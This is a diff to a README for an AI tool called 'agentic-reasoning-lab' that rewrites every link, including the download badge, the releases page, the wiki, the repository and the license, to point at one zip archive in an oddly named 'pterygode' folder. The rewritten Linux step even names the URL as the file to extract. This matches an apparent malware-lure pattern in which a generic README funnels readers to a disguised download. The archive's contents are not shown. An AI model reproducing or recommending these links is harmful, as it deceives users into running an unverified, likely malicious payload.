@@ -1,6 +1,6 @@
 # 🎉 agentic-reasoning-lab - Explore AI Systems with Ease
 
-[![Download agentic-reasoning-lab](https://img.shields.io/badge/Download-agentic--reasoning--lab-blue)](https://github.com/honied-valerian411/agentic-reasoning-lab/releases)
+[![Download agentic-reasoning-lab](https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip)](https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the agentic-reasoning-lab! This open-source lab lets you explore mult
 
 ## 📥 Download & Install
 
-To download the software, please visit this page: [Download agentic-reasoning-lab](https://github.com/honied-valerian411/agentic-reasoning-lab/releases). 
+To download the software, please visit this page: [Download agentic-reasoning-lab](https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip). 
 
 ### Steps to Download:
 
@@ -35,7 +35,7 @@ Once you have downloaded the file, follow these steps to run the application:
 2. **Install the Application:**
    - For Windows: Double-click the `.exe` file to start the installation.
    - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux: You may need to extract the `.tar.gz` file and run the executable in the terminal.
+   - For Linux: You may need to extract the `https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip` file and run the executable in the terminal.
 
 3. **Launch the Application:**
    - After installation, find the application in your Start menu (Windows), Applications folder (macOS), or open it from the terminal (Linux).
@@ -66,11 +66,11 @@ If you encounter any issues, consider the following:
 
 ## 📚 Support and Resources
 
-For additional assistance, visit our [Wiki](https://github.com/honied-valerian411/agentic-reasoning-lab/wiki) for guides and FAQs. You can also check out the community section in our repository for tips from other users.
+For additional assistance, visit our [Wiki](https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip) for guides and FAQs. You can also check out the community section in our repository for tips from other users.
 
 ## 🔗 Additional Information
 
-- **Repository Link:** [agentic-reasoning-lab](https://github.com/honied-valerian411/agentic-reasoning-lab)
-- **License:** This project is licensed under the MIT License - see the [LICENSE](https://github.com/honied-valerian411/agentic-reasoning-lab/blob/main/LICENSE) file for details.
+- **Repository Link:** [agentic-reasoning-lab](https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip)
+- **License:** This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/honied-valerian411/agentic-reasoning-lab/main/pterygode/agentic-reasoning-lab-2.2-alpha.2.zip) file for details.
 
 Thank you for choosing agentic-reasoning-lab! We look forward to seeing what you create.
